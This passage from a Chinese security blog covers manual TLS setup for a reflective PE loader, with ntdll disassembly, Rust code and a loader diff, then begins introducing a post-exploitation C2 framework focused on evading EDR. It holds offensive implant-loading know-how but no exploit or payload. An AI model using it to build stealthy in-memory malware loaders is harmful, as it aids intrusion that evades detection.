\u5176\u5411\u4e0b\u8df3\u8f6c\u5230\u4e0b\u65b9\u7684 <code>function chunk</code> \u4e2d\u4e86\uff0c \u597d\u7684\uff0c \u5f02\u5e38\u89e3\u6790</p> <pre><code>.text:0000000078EF1CC6 loc_78EF1CC6:                           ; CODE XREF: LdrpHandleTlsData+4C\u2191j\n.text:0000000078EF1CC6                                         ; DATA XREF: .pdata:0000000078F9E408\u2193o ...\n...\n.text:0000000078EF1DCF                 mov     rdx, rbx\n.text:0000000078EF1DD2                 mov     rcx, [rsp+0D8h+Size] ; Src\n.text:0000000078EF1DD7                 call    LdrpAllocateTlsEntry\n</code></pre> <p>\u8fd9\u79cd\u60c5\u51b5\u81ea\u7136\u4e5f\u662f\u53ef\u4ee5\u89e3\u51b3\u7684\uff0c \u4ed4\u7ec6\u89c2\u5bdf\u53ef\u4ee5\u53d1\u73b0\u8fd9\u6bb5\u8df3\u8f6c\u88ab <code>.pdata</code> \u6bb5\u5f15\u7528\uff0c \u90a3\u4e48\u53ea\u9700\u8981\u5224\u65ad\u5176\u4f4d\u7f6e\u662f\u5426\u5728<code>.pdata</code>\u6bb5\u7684\u5f02\u5e38\u8868\u4e2d\uff0c \u5e76\u89e3\u6790<code>RUNTIME_FUNCTION</code>\u5c31\u53ef\u4ee5\u627e\u5230\u6211\u4eec\u7684<code>LdrpHandleTlsData</code> \u51fd\u6570\u4e86\uff0c <code>win7</code> \u5982\u6b64\uff0c \u5176\u5b83\u7248\u672c\u5462\uff0c \u8ba9\u6211\u4eec\u4e0b\u8f7d\u4e00\u4e2a <code>win8</code></p> <pre><code>.text:00000001800AC1FE ; START OF FUNCTION CHUNK FOR LdrpInitializeTls\n.text:00000001800AC1FE\n.text:00000001800AC1FE loc_1800AC1FE:                          ; CODE XREF: LdrpInitializeTls+A4\u2191j\n.text:00000001800AC1FE                                         ; DATA XREF: .pdata:0000000180139860\u2193o\n.text:00000001800AC1FE                 mov     [rsp+68h+var_38], rax\n.text:00000001800AC203                 lea     rcx, [rdi+48h]\n.text:00000001800AC207                 lea     rax, aDllWzHasTlsInf ; \"DLL \\\"%wZ\\\" has TLS information at %p\\n\"\n.text:00000001800AC20E                 mov     [rsp+68h+var_40], rcx\n.text:00000001800AC213                 lea     r8, aLdrpinitialize_5 ; \"LdrpInitializeTls\"\n.text:00000001800AC21A                 lea     rcx, aMinkernelNtdll_6 ; \"minkernel\\\\ntdll\\\\ldrtls.c\"\n.text:00000001800AC221                 mov     r9d, 2\n.text:00000001800AC227                 mov     edx, 242h\n.text:00000001800AC22C                 mov     [rsp+68h+var_48], rax\n.text:00000001800AC231                 call    LdrpLogDbgPrint\n.text:00000001800AC236                 nop\n.text:00000001800AC237                 jmp     loc_1800270B6\n.text:00000001800AC23C ; ---------------------------------------------------------------------------\n.text:00000001800AC23C\n.text:00000001800AC23C loc_1800AC23C:                          ; CODE XREF: LdrpInitializeTls+DC\u2191j\n...\n</code></pre> <p>\u53c8\u4e0d\u4e00\u6837\u4e86\uff0c \u597d\u5728 <code>LdrpHandleTlsData</code> \u662f\u4e00\u6837\u7684\uff0c \u4e0d\u9700\u8981\u518d\u5904\u7406\u4e86</p> <p>\u8fd9\u91cc\u53ef\u4ee5\u53d1\u73b0\u5176\u901a\u8fc7\u518d\u4e00\u6b21\u8df3\u8f6c\u624d\u4f1a\u5230\u6211\u4eec\u7684<code>LdrpAllocateTlsEntry</code></p> <pre><code>.text:00000001800270B6 loc_1800270B6:                          ; CODE XREF: LdrpInitializeTls+8522B\u2193j\n.text:00000001800270B6                 test    bpl, bpl\n.text:00000001800270B9                 jnz     short loc_180027137\n.text:00000001800270BB\n.text:00000001800270BB loc_1800270BB:                          ; CODE XREF: LdrpInitializeTls+12C\u2193j\n.text:00000001800270BB                 lea     r8, [rsp+68h+arg_0]\n.text:00000001800270C0                 xor     r9d, r9d\n.text:00000001800270C3                 mov     rdx, rdi\n.text:00000001800270C6                 mov     rcx, rsi\n.text:00000001800270C9                 mov     [rsp+68h+var_48], rbp\n.text:00000001800270CE                 call    LdrpAllocateTlsEntry\n.text:00000001800270D3                 test    eax, eax\n.text:00000001800270D5                 js      short loc_18002709E\n.text:00000001800270D7                 mov     eax, 0FFFFh\n.text:00000001800270DC                 mov     [rdi+6Eh], ax\n.text:00000001800270E0                 jmp     short loc_18002707F\n</code></pre> <p>\u518d\u8bd5\u51e0\u4e2a\u7248\u672c\uff0c \u5747\u662f\u8fd9\u6837\uff0c \u90a3\u4e48\u57fa\u672c\u53ef\u4ee5\u7528\u8fd9\u79cd\u65b9\u5f0f\u786e\u5b9a\u4e86</p> <p>\u5148\u67e5\u627e <code>LdrpInitializeTls</code> \u5b57\u7b26\u4e32\u7684\u5f15\u7528\uff0c \u627e\u5230 <code>LdrpLogDbgPrint</code> \u51fd\u6570\u540e\u5224\u65ad\u5176\u4e0b\u65b9\u6307\u4ee4\u662f\u5426\u4e3a<code>nop; jmp rva</code>\uff0c \u662f\u5c31\u8ddf\u968f\u8fc7\u53bb\u5bfb\u627e <code>LdrpAllocateTlsEntry</code>, \u627e\u5230\u540e\u518d\u53bb\u67e5\u627e\u5176\u5f15\u7528\uff0c \u627e\u5230\u5728 <code>LdrpHandleTlsData</code> \u7684\u5f15\u7528\u4f4d\u7f6e\u540e\uff0c \u5224\u65ad\u8be5\u4f4d\u7f6e\u662f\u5426\u5728<code>.pdata</code> \u8868\u4e2d\u88ab\u8bb0\u5f55\uff0c \u5982\u679c\u88ab\u8bb0\u5f55\u5219\u53cd\u67e5\u5230 <code>LdrpHandleTlsData</code>\uff0c \u4e0d\u7136\u5c31\u5411\u4e0a\u627e\u5230\u586b\u5145\u7684<code>0xCC</code>\u6216<code>0x90</code>\u4e3a\u6b62\uff0c \u81f3\u6b64\uff0c \u57fa\u672c\u4e0a\u5c06\u9700\u8981\u8bb0\u5f55\u7279\u5f81\u5b57\u7b26\u53ca\u504f\u79fb\u4f4d\u7f6e\u7cbe\u7b80\u5230\u51e0\u4e2a\u5224\u65ad\u7684\u60c5\u51b5\u4e86</p> <p>\u5f53\u7136\uff0c \u5982\u679c\u57fa\u4e8e\u524d\u4eba\u7684\u5de5\u4f5c\uff0c \u6211\u4eec\u53ea\u9700\u8981\u8003\u8651<code>win11</code> \u7684\u60c5\u51b5\u5c31\u4e0d\u5fc5\u89e3\u6790<code>.pdata</code> \u6bb5\u4e86\uff0c \u8fd9\u91cc\u5c31\u8bb8\u613f <code>windows</code> \u540e\u7eed\u7684\u66f4\u65b0\u4e0d\u4f1a\u518d\u6709\u5176\u5b83\u60c5\u51b5\u4e86 :)</p> <p>\u800c\u65b9\u6cd5\u4e8c\u5462\uff0c \u6211\u4eec\u662f\u5426\u53ef\u4ee5\u5b9e\u73b0\u4e00\u4e2a <code>LdrpHandleTlsData</code> \u6765\u5b8c\u6210\u5de5\u4f5c\u5462\uff0c\u901a\u8fc7<code>hook</code> \u7ebf\u7a0b\u542f\u52a8\u6765\u4e3a\u6bcf\u4e00\u4e2a\u65b0\u7ebf\u7a0b\u505a\u5904\u7406\uff1f\u8fd9\u81ea\u7136\u4e5f\u662f\u53ef\u884c\u7684\uff0c\u6bd4\u5982 VistaImplicitTls \u6216 MemoryModulePP  \u4f46\u5728\u6211\u4eec\u7684\u573a\u666f\u4e2d\uff0c \u7a33\u5b9a\u6027\u548c\u7b80\u6d01\u6027\u66f4\u4e3a\u91cd\u8981\uff0c \u4f46\u5982\u679c\u53ea\u662f\u4e3a\u4e86\u5728\u7eafc\u73af\u5883\u4e2d\u52a0\u8f7d\u6211\u4eec\u7684\u7684 <code>hello world</code>\uff0c \u6211\u4eec\u53ef\u4ee5\u5199\u4e00\u4e2a\u7b80\u5316\u7684 <code>demo</code>, \u53c2\u8003\u4e8e Manually-fixing-static-tls</p> <pre><code>pub unsafe fn ldrp_handle_tls_data_demo(\n    module_base: *const core::ffi::c_void,\n    module_entry: *mut LDR_DATA_TABLE_ENTRY,\n) {\n    (*module_entry).DllBase = module_base as _;\n    let mut size = 0;\n    let tls_directory: *mut IMAGE_TLS_DIRECTORY = MRtlImageDirectoryEntryToData(\n        module_base as _, \n        1,\n        IMAGE_DIRECTORY_ENTRY_TLS,\n        &amp;mut size as *mut _ as _\n    ) as _;\n    let mut old = 0;\n    MVirtualProtect(tls_directory as _, size_of::&lt;IMAGE_TLS_DIRECTORY&gt;(), PAGE_EXECUTE_READWRITE, &amp;mut old as *mut _ as _);\n    println!(\"[+] size is {:x}\", size);\n    if tls_directory.is_null() || size.eq(&amp;0) {\n        println!(\"[+] tls directory is null\");\n        return;\n    }\n    println!(\"[+] tls directory is not null, it is {:#?}\", tls_directory as *const core::ffi::c_void);\n    let LdrpTlsList: *const core::ffi::c_void = 0x00007ffa46110388usize as _;\n    let LdrpLdrpTlsBitmap: *const core::ffi::c_void = 0x00007ffa461162a0usize as _;\n    let index = MRtlFindClearBitsAndSet(\n        LdrpLdrpTlsBitmap as _, \n        1, \n        0\n    );\n\n    (*tls_directory).AddressOfIndex = index as _;\n    println!(\"[+] index is {:x}\", index);\n    let tls_entry: *mut TLS_ENTRY = MHeapAlloc(size_of::&lt;TLS_ENTRY&gt;(), 0) as _;\n    println!(\"[+] index is {:x}\", index);\n    (*tls_entry).TlsDirectory = *tls_directory;\n    (*tls_entry).ModuleTlsData = module_entry;\n    (*tls_entry).TlsIndex = index as _;\n    println!(\"[+] will insert tail list\");\n    // RtlInitializeListEntry(&amp;mut (*tls_entry).TlsEntryLinks as *mut _ as _);\n    InsertTailList(\n        LdrpTlsList as _, \n        &amp;mut (*tls_entry).TlsEntryLinks as *mut _ as _\n    );\n    println!(\"[+] insert tail list success\");\n    let mut thread_base_info: THREAD_BASIC_INFORMATION = core::mem::zeroed();\n    let hthread = MGetCurrentThread();\n    let mut dw: u32 = 0;\n    MNtQueryInformationThread(\n        hthread, \n        ThreadBasicInformation as _, \n        &amp;mut thread_base_info as *mut _ as _, \n        size_of::&lt;THREAD_BASIC_INFORMATION&gt;() as _, \n        &amp;mut dw as *mut _);\n    MCloseHandle(hthread);\n    println!(\"[+] query information thread\");\n    let teb1: *mut TEB2 = thread_base_info.TebBaseAddress as _;\n\n    let new_tls: *mut *mut usize = MHeapAlloc((index + 1) as usize * size_of::&lt;usize&gt;(), 0) as _;\n\n    if (*teb1).ThreadLocalStoragePointer.is_null() {\n        memset(\n            new_tls as _, \n            0, \n            index as usize * size_of::&lt;usize&gt;());\n    } else {\n        memcpy(\n            new_tls as _, \n            (*teb1).ThreadLocalStoragePointer as _, \n            index as usize * size_of::&lt;usize&gt;());\n    }\n    println!(\"[+] thread lodal storage is {:x}\", (*teb1).ThreadLocalStoragePointer as usize);\n\n    (*teb1).ThreadLocalStoragePointer = new_tls as _;\n    // (*teb1).ThreadLocalStoragePointer =  null_mut();\n    let size = (*tls_directory).EndAddressOfRawData - (*tls_directory).StartAddressOfRawData;\n    let tls_data = MHeapAlloc(size as _, 0);\n    memcpy(\n        tls_data as _, \n        (*tls_directory).StartAddressOfRawData as _, \n        size as _);\n    *new_tls.offset(index as _) = tls_data as _;\n}\n</code></pre> <p>\u5f53\u7136\uff0c \u8fd9\u4e5f\u4e0e <code>xbox loader</code> \u7684\u5c1d\u8bd5\u7c7b\u4f3c</p> <pre><code>diff --git a/crates/loader/src/lib.rs b/crates/loader/src/lib.rs\nindex 97311d0..d66773d 100755\n--- a/crates/loader/src/lib.rs\n+++ b/crates/loader/src/lib.rs\n@@ -180,34 +185,53 @@ unsafe fn reflective_loader_impl(context: LoaderContext) {\n             .OptionalHeader\n             .AddressOfEntryPoint as usize) as *const c_void;\n\n-    let tls_directory = &amp;ntheader_ref.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];\n+    let tls_directory =\n+        &amp;ntheader_ref.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS as usize];\n+\n+    // Grab the TLS data from the PE we're loading\n+    let tls_data_addr =\n+        baseptr.offset(tls_directory.VirtualAddress as isize) as *mut IMAGE_TLS_DIRECTORY64;\n+\n+    // TODO: Patch the module list\n+    let tls_index = patch_module_list(\n+        context.image_name,\n+        baseptr,\n+        imagesize,\n+        context.fns.get_module_handle_fn,\n+        tls_data_addr,\n+        context.fns.virtual_protect,\n+        entrypoint,\n+    );\n+\n     if tls_directory.Size &gt; 0 {\n         // Grab the TLS data from the PE we're loading\n         let tls_data_addr =\n             baseptr.offset(tls_directory.VirtualAddress as isize) as *mut IMAGE_TLS_DIRECTORY64;\n\n-        let tls_data: &amp;IMAGE_TLS_DIRECTORY64 = unsafe { core::mem::transmute(tls_data_addr) };\n+        let tls_data: &amp;mut IMAGE_TLS_DIRECTORY64 = unsafe { core::mem::transmute(tls_data_addr) };\n\n         // Grab the TLS start from the TEB\n         let tls_start: *mut *mut c_void;\n         unsafe { core::arch::asm!(\"mov {}, gs:[0x58]\", out(reg) tls_start) }\n\n-        let tls_index = unsafe { *(tls_data.AddressOfIndex as *const u32) };\n-\n         let tls_slot = tls_start.offset(tls_index as isize);\n         let raw_data_size = tls_data.EndAddressOfRawData - tls_data.StartAddressOfRawData;\n-        *tls_slot = (context.fns.virtual_alloc)(\n+        let tls_data_addr = (context.fns.virtual_alloc)(\n             ptr::null(),\n-            raw_data_size as usize,\n+            raw_data_size as usize, // + tls_data.SizeOfZeroFill as usize,\n             MEM_COMMIT,\n             PAGE_READWRITE,\n         );\n\n-        // if !tls_start.is_null() {\n-        //     // Zero out this memory\n-        //     let tls_slots: &amp;mut [u64] = unsafe { core::slice::from_raw_parts_mut(tls_start, 64) };\n-        //     tls_slots.iter_mut().for_each(|slot| *slot = 0);\n-        // }\n+        core::ptr::copy_nonoverlapping(\n+            tls_data.StartAddressOfRawData as *const _,\n+            tls_data_addr,\n+            raw_data_size as usize,\n+        );\n+\n+        // Update the TLS index\n+        core::ptr::write(tls_data.AddressOfIndex as *mut u32, tls_index);\n+        *tls_slot = tls_data_addr;\n\n         let mut callbacks_addr = tls_data.AddressOfCallBacks as *const *const c_void;\n         if !callbacks_addr.is_null() {\n</code></pre>"},{"location":"blog/2025/01/07/IoM_advanced_TLS/#\u95f2\u8a00\u7247\u8bed","title":"\u95f2\u8a00\u7247\u8bed","text":"<p>\u7531\u4e8e\u6d4b\u8bd5\u6027\u4ee3\u7801\u548c\u5de5\u7a0b\u5316\u7684\u5dee\u8ddd\u8fd8\u6709\u5f88\u591a\u8ddd\u79bb\uff0c \u800c\u672c\u6587\u5e76\u975e\u4e3a\u4e86\u8bf4\u660e\u5de5\u7a0b\u5316\u8fc7\u7a0b\uff0c \u56e0\u6b64\u672c\u6587\u53ea\u8ba8\u8bba\u4e86windows11\u7248\u672c\u4e14\u7a0b\u5e8f\u572864\u4f4d\u7684\u60c5\u51b5\uff0c 32\u4f4d\u5c31\u4f1a\u7565\u6709\u4e0d\u540c</p> <p>\u5982\u679c\u80fd\u5c06\u6587\u7ae0\u770b\u5230\u8fd9\u91cc\uff0c \u5e0c\u671b\u5404\u4f4d\u90fd\u6709\u6240\u6536\u83b7\uff0c \u90a3\u4e48\u5269\u4e0b\u7684\u5185\u5bb9\u5c31\u7559\u7ed9\u5404\u4f4d\u81ea\u5df1\u6765\u5b8c\u6210\u5566</p> <p>\u5f53\u7136\uff0c \u7531\u4e8e\u672c\u4eba\u624d\u758f\u5b66\u6d45\uff0c \u56e0\u6b64\u5982\u6709\u9519\u8bef\u7684\u5730\u65b9\u6b22\u8fce\u5404\u4f4d\u4e0e\u6211\u8ba8\u8bba\uff0c \u8ba9\u6211\u4eec\u4e00\u8d77\u8ffd\u6839\u6eaf\u6e90 :\uff09</p>"},{"location":"blog/2025/01/07/IoM_advanced_TLS/#references","title":"References","text":"<p>\u975e\u5e38\u611f\u8c22\u4e0b\u9762\u51e0\u7bc7\u6587\u7ae0\u4e3a\u672c\u6587\u548c\u89e3\u51b3<code>TLS</code>\u95ee\u9898\u6240\u7ed9\u4e88\u7684\u975e\u5e38\u5927\u7684\u5e2e\u52a9:)</p> <p>\u5c24\u5176\u611f\u8c22 <code>Ken Johnson(Skywing)</code> \u5bf9 <code>windows TLS</code> \u673a\u5236\u7684\u8be6\u7ec6\u5206\u6790\u4e0e\u89e3\u91ca\uff0c \u6ca1\u6709\u4ed6\u7684\u7cfb\u5217\u6587\u7ae0\uff0c \u672c\u6587\u7684\u7bc7\u5e45\u548c\u6240\u8981\u82b1\u8d39\u7684\u65f6\u95f4\u5c06\u8fdc\u8d85\u9884\u671f :)</p> <p>http://www.nynaeve.net/?p=180 https://landaire.net/reflective-pe-loader-for-xbox/ Thread_local_Storage 16-std\u5e93(\u4e94)\u7ebf\u7a0b\u7ba1\u7406 static-tls-storage Manually-fixing-static-tls</p>"},{"location":"blog/2024/08/16/IoM_introduce/","title":"\u4e0b\u4e00\u4ee3C2\u8ba1\u5212     Internet of Malice","text":"<p>\u8fd9\u91cc\u53ef\u4ee5\u627e\u5230IoM\u7684\u5168\u90e8\u4fe1\u606f https://chainreactors.github.io/wiki/IoM/</p> <p>Internet of Malice(\u6076\u8054\u7f51) \u529b\u56fe\u5b9e\u73b0\u4e00\u5957post-exploit\u57fa\u7840\u8bbe\u65bd, \u5728\u517c\u5bb9CS,MSF,Sliver\u751f\u6001\u7684\u540c\u65f6, \u63d0\u4f9b\u66f4\u9ad8\u7684\u62d3\u5c55\u6027\u4e0e\u9690\u853d\u6027, \u5e76\u63d0\u4f9b\u4e00\u5957\u5de5\u7a0b\u5316\u7684\u89e3\u51b3\u65b9\u6848.</p>"},{"location":"blog/2024/08/16/IoM_introduce/#\u80cc\u666f","title":"\u80cc\u666f","text":"<p>\u8fd1\u5e74\u6765\u5f00\u5c55\u7684\u5927\u91cf\u653b\u9632\u6d3b\u52a8\u5c06\u7f51\u7edc\u5b89\u5168\u884c\u4e1a\u63a8\u5411\u4e86\u5b9e\u7f51\u5bf9\u6297(Real World), \u800c\u4e0d\u518d\u662f\u6a21\u62df\u73af\u5883(CTF), \u7406\u8bba\u73af\u5883(\u4f20\u7edf\u7f51\u7edc\u5b89\u5168\u5efa\u8bbe)\u7684\u5bf9\u6297. \u5728\u5b9e\u7f51\u5bf9\u6297\u4e2d, \u653b\u51fb\u65b9\u5ef6\u7533\u51fa\u4e86\u4e09\u4e2a\u4e3b\u8981\u7684\u7ec6\u5206\u9886\u57df:</p> <ol> <li>pre-exploit \u901a\u8fc7\u5404\u79cd\u65b9\u5f0f\u7684\u4fe1\u606f\u6536\u96c6, \u627e\u5230\u53ef\u4ee5exploit\u7684\u76ee\u6807, \u8fd9\u4e2a\u65b9\u5411\u53d1\u5c55\u51fa\u4e86ASM(\u653b\u51fb\u9762\u7ba1\u7406), Cyberspace-Mapping(\u7f51\u7edc\u7a7a\u95f4\u6d4b\u7ed8), VM(\u6f0f\u6d1e\u7ba1\u7406)\u7b49\u7ec6\u5206\u9886\u57df\u7684\u4ea7\u54c1.</li> <li>exploit  \u8fd9\u4e2a\u65b9\u5411\u6709\u4f20\u7edf\u7684Scanner(\u81ea\u52a8\u5316\u626b\u63cf\u5668), \u4eca\u5e74\u6765\u4e5f\u51fa\u73b0\u4e86\u65b0\u5174\u9886\u57df BAS(\u5165\u4fb5\u6a21\u62df), Exploit-Framework(\u6f0f\u6d1e\u5229\u7528\u6846\u67b6), Exploit-Platform(\u6f0f\u6d1e\u77e5\u8bc6\u5e93/\u6f0f\u6d1e\u4ea4\u6613\u5e73\u53f0)\u7b49\u7b49</li> <li>post-exploit \u540e\u5229\u7528, \u8fd9\u4e2a\u9886\u57df\u7684\u9632\u5b88\u65b9\u7684\u9632\u62a4\u624b\u6bb5\u8d8a\u6765\u8d8a\u6210\u719f, \u6709\u5927\u91cf <code>*DR/HIDS</code>(\u7aef\u4e0a\u9632\u62a4), SOAR(\u81ea\u52a8\u5316\u54cd\u5e94), CTI(\u5a01\u80c1\u60c5\u62a5) \u8bbe\u5907\u7b49\u7b49, \u4f46\u5728\u653b\u51fb\u65b9\u89c6\u89d2\u4e2d, \u5168\u90e8\u7684\u5bf9\u6297\u90fd\u51dd\u7f29\u5728AS(\u653b\u51fb\u6a21\u62df, \u53ef\u4ee5\u7406\u89e3\u4e3aC2/Webshell)\u4e0a. </li> </ol> <p>\u4e0a\u9762\u6bcf\u4e2a\u63d0\u5230\u7684\u6bcf\u4e2a\u504f\u5411\u9632\u5b88\u7684\u7ec6\u5206\u9886\u57df\u5728\u8fd1\u4e9b\u5e74\u6765\u90fd\u51fa\u73b0\u4e86\u5bf9\u5e94\u7684\u521b\u4e1a\u516c\u53f8, \u6709\u4e0d\u5c11\u5df2\u7ecf\u6210\u957f\u4e3a\u5e9e\u7136\u5927\u7269. </p> <p>\u4f46\u5bf9\u4e8e\u504f\u5411\u653b\u51fb\u6a21\u62df\u65b9\u5411, \u4e00\u822c\u662f\u7531\u4e59\u65b9\u7ec4\u5efa\u7684\u653b\u51fb\u961f\u5b9e\u65bd, \u5176\u4e2d\u57fa\u5efa\u662f\u4ed6\u4eec\u6700\u6838\u5fc3\u7684\u80fd\u529b, \u9700\u8981\u8ba9\u8fd9\u5757\u80fd\u529b\u7ef4\u6301\u9ed1\u76d2\u72b6\u6001\u4ee5\u4fdd\u6301\u5bf9\u53cb\u5546\u7684\u9886\u5148. \u7532\u65b9\u53ea\u80fd\u901a\u8fc7\u8d2d\u4e70\u670d\u52a1\u7684\u65b9\u5f0f, \u81f3\u591a\u4e5f\u53ea\u80fd\u6316\u51e0\u4e2a\u7ecf\u9a8c\u4e30\u5bcc\u7684\u7ea2\u961f. \u5c3d\u7ba1\u8fd9\u4e24\u5e74\u51fa\u73b0\u4e86\u4e00\u4e2a\u65b0\u6982\u5ff5BAS(\u5165\u4fb5\u548c\u653b\u51fb\u6a21\u62df), \u901a\u8fc7\u4f7f\u7528playbook\u7684\u65b9\u5f0f\u81ea\u52a8\u5316\u91cd\u653e\u653b\u51fb\u8fc7\u7a0b, \u5b9e\u73b0\u4e86\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u5bf9\u9632\u62a4\u80fd\u529b\u7684\u68c0\u9a8c, \u4f46\u56e0playbook\u7684\u5f3a\u5ea6\u8fdc\u8fdc\u5c0f\u4e8e\u7ea2\u84dd\u5bf9\u6297\u7684\u5f3a\u5ea6, BAS\u81f3\u591a\u6210\u4e3a\u7ea2\u84dd\u5bf9\u6297\u7684\u4e0b\u4f4d\u66ff\u4ee3, \u800c\u975eSRC\u4e4b\u4e8e\u6f0f\u626b\u8fd9\u6837\u7684\u8865\u5145. </p> <p>\u800c\u5728\u56fd\u5916\u51fa\u73b0\u4e86\u4e0d\u5c11\u8fd9\u4e2a\u9886\u57df(offensive security\u9886\u57df)\u7684\u521b\u4e1a\u516c\u53f8. \u56fd\u5185\u6682\u65f6\u5f88\u96be\u590d\u73b0\u4ed6\u4eec\u7684\u8def\u7ebf, \u4f46\u662f\u81f3\u5c11\u5e94\u8be5\u8fdb\u884c\u4e00\u4e9b\u5b9e\u9a8c. </p> <p>\u51e0\u4e4e\u6240\u6709\u4f01\u4e1a\u7684\u7edd\u5927\u90e8\u5206\u5b89\u5168\u9884\u7b97\u90fd\u7528\u5728\u5bf9C2(\u4ee5\u53ca\u76f8\u5173\u884d\u751f\u6280\u672f)\u7684\u9632\u62a4\u4e0a, \u4f46\u5728\u56fd\u5185\u5374\u7f3a\u5c11\u5bf9\u5e94\u7684\u6a21\u62df\u80fd\u529b. \u4e0d\u8bba\u662f\u7532\u65b9\u5efa\u8bbe\u5185\u90e8\u84dd\u519b, \u4ea6\u6216\u662f\u4e3a\u4e86\u7ea2\u84dd\u5bf9\u6297\u9700\u6c42\u7684\u4e59\u65b9\u7ea2\u961f\u6216\u72ec\u7acb\u7ea2\u961f\u90fd\u9700\u8981\u4e00\u5957\u57fa\u7840\u8bbe\u65bd\u6765\u6a21\u62df\u6216\u68c0\u6d4b. \u7ea2\u84dd\u5bf9\u6297\u7684\u6548\u679c\u662f\u8fdc\u8fdc\u4f18\u4e8e\u4f9d\u8d56\u50f5\u786c\u7684playbook\u7684BAS\u7684.</p> <p>\u8fd1\u5e74\u6765\u5927\u578b\u4f01\u4e1a\u90fd\u5efa\u7acb\u4e86\u81ea\u5df1\u7684\u84dd\u519b, \u4f46\u5b89\u5168\u884c\u4e1a\u53ea\u63d0\u4f9b\u9632\u62a4\u7c7b\u4ea7\u54c1, \u84dd\u519b\u9762\u4e34\u7740\u5149\u6709\u4eba, \u5176\u4ed6\u7684\u4e00\u5207\u90fd\u5f97\u81ea\u5df1\u642d\u5efa\u7684\u56f0\u96be.</p>"},{"location":"blog/2024/08/16/IoM_introduce/#\u56fd\u5916\u5546\u4e1a\u5316\u4ea7\u54c1","title":"\u56fd\u5916\u5546\u4e1a\u5316\u4ea7\u54c1","text":"<ul> <li>CobaltStrike \u5f00\u53d1\u5546outfrank, \u8fd1\u4e9b\u5e74\u6700\u6d41\u884c\u7684C2\u6846\u67b6, \u51ed\u501f\u7740\u65b9\u4fbf\u7684GUI, \u6781\u9ad8\u7684\u62d3\u5c55\u6027, \u793e\u533a\u4ee5\u53ca\u4e8c\u5f00\u4fbf\u5229\u4f18\u52bf\u62ff\u4e0b\u4e86\u6700\u9ad8\u7684\u5e02\u573a\u5360\u6709\u7387.  \u5e76\u6709\u4e00\u7cfb\u5217\u7684\u76f8\u5173\u9886\u57df\u7684\u5de5\u5177\u94fe, https://www.outflank.nl/products/outflank-security-tooling/ . \u968f\u77404.5\u7248\u672c\u7684\u6e90\u7801\u6cc4\u9732, \u6709\u8d8a\u6765\u8d8a\u591a\u7684\u57fa\u4e8e\u5176\u6e90\u7801\u4e8c\u5f00\u7684\u6846\u67b6.</li> <li>Metasploit \u5f00\u53d1\u5546rapid7, \u62e5\u6709\u6700\u5168\u9762\u7684exploit\u4e0epost-exploit \u6846\u67b6, \u5e02\u9762\u4e0a\u80fd\u89c1\u5230\u7684\u7edd\u5927\u90e8\u5206\u81ea\u7814C2\u4e0d\u662f\u57fa\u4e8eCS\u4e8c\u5f00\u5c31\u662f\u57fa\u4e8eMSF\u4e8c\u5f00.  \u4f46\u4e5f\u56e0\u4e3a\u8fc7\u4e8e\u7b28\u91cd\u4ee5\u53ca\u5728teamserver\u65b9\u9762\u7684\u52a3\u52bf, \u5728\u5b9e\u6218\u4e2d\u5e76\u4e0d\u5e38\u89c1.  \u6709\u4e00\u4e2a\u57fa\u4e8eMSF\u7684teamserver\u4e0egui\u5316\u7684\u5f00\u6e90\u9879\u76ee https://github.com/FunnyWolf/Viper</li> <li>nighthawk \u6765\u81ea\u82f1\u56fd\u7684\u5546\u4e1a\u5316C2\u6846\u67b6, \u4e13\u6ce8opsec, \u4f46\u56e0\u4e3a\u65e0\u516c\u5f00\u6d41\u51fa\u7248\u672c, \u6ca1\u6709\u6df1\u5ea6\u4f53\u9a8c.  </li> <li>bruteratel \u6765\u81ea\u7f8e\u56fd\u5546\u4e1aC2\u6846\u67b6, \u8fd1\u671f\u6709\u6d41\u51fa\u7248\u672c, \u6709\u88abapt,\u52d2\u7d22\u7ec4\u7ec7\u4f7f\u7528\u6848\u4f8b. </li> </ul>"},{"location":"blog/2024/08/16/IoM_introduce/#\u5f00\u6e90\u751f\u6001","title":"\u5f00\u6e90\u751f\u6001","text":"<ul> <li>sliver  \u5f00\u53d1\u5546bishopfox. \u4e00\u4e2a\u65b0\u5174\u7684\u5f00\u6e90C2. \u62e5\u6709\u8bb8\u591a\u72ec\u7279\u7684\u529f\u80fd, \u4f8b\u5982cursed, \u5bc6\u7801\u5b66\u5b89\u5168\u7684\u6d41\u91cf\u7279\u6027\u7b49, \u4ee5\u53ca\u81ea\u5df1\u7684\u751f\u6001armory. </li> <li>havoc implant\u57fa\u4e8eC\u5f00\u53d1, \u901a\u8fc7\u517c\u5bb9BOF\u83b7\u5f97\u4e86\u4e0d\u5c11CS\u7684\u80fd\u529b. </li> <li>mythic \u672c\u8d28\u4e0a\u662f\u4e00\u5957\u901a\u8baf\u534f\u8bae\uff0c \u5b9e\u73b0\u4e86\u8fd9\u4e2a\u901a\u8baf\u534f\u8bae\u7684agent\u53ef\u4ee5\u4e0e\u8fd9\u4e2a\u6846\u67b6\u4ea4\u4e92.</li> </ul> <p>\u4ece\u57fa\u7840\u529f\u80fd\u4e0a\u6765\u8bf4, \u57fa\u672c\u529f\u80fd\u4e4b\u95f4\u5927\u540c\u5c0f\u5f02, \u7a33\u5b9a\u8fd0\u884c\u7684implant, \u9002\u5408\u56e2\u961f\u534f\u4f5c\u7684teamserver, \u4fbf\u5229\u7684\u5ba2\u6237\u7aef. \u5546\u4e1a\u5316\u5de5\u5177\u4e0e\u5f00\u6e90\u5de5\u5177\u6700\u5927\u7684\u533a\u522b\u662f\u5728OPSEC\u4e0a, \u5176\u4e2d\u505a\u5f97\u6bd4\u8f83\u597d\u7684\u662fnighthawk\u4e0ecobaltstrike, \u4ed6\u4eec\u62e5\u6709\u5927\u91cf\u672a\u516c\u5f00\u7684EDR\u5bf9\u6297\u6280\u672f, \u5e76\u6709\u826f\u597d\u7684\u5de5\u7a0b\u5316\u4e0e\u81ea\u5b9a\u4e49\u65b9\u6848\u3002</p> <p>\u5728\u8fd9\u4e2a\u9886\u57df\u91cc, \u793e\u533a\u7684\u7e41\u8363\u5f80\u5f80\u610f\u5473\u7740\u66f4\u5927\u7684\u514d\u6740\u96be\u5ea6, OPSEC\u96be\u5ea6. </p> <p>\u800c\u5728\u56fd\u5185\u5e76\u4e0d\u7f3a\u5c11\u5355\u72ec\u7684EDR\u5bf9\u6297\u6280\u672f, 